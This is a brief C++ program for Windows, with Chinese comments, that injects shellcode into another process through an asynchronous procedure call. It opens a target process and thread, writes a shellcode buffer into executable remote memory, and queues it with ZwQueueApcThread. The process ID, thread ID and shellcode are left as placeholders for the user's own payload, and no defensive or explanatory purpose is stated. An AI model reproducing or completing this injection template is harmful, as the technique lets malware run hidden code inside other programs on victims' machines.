#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* myZwQueueApcThread)(HANDLE, PKNORMAL_ROUTINE, PVOID, PVOID, PVOID);

int main() {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 目标进程PID);
    HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, 目标线程TID);

    // 分配内存并写入shellcode
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    unsigned char shellcode[] = "..."; // 你的shellcode
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);

    // 使用ZwQueueApcThread将shellcode注入目标线程
    myZwQueueApcThread fZwQueueApcThread = (myZwQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll"), "ZwQueueApcThread");
    fZwQueueApcThread(threadHandle, (PKNORMAL_ROUTINE)remoteBuffer, NULL, NULL, NULL);

    CloseHandle(threadHandle);
    CloseHandle(processHandle);

    return 0;
}
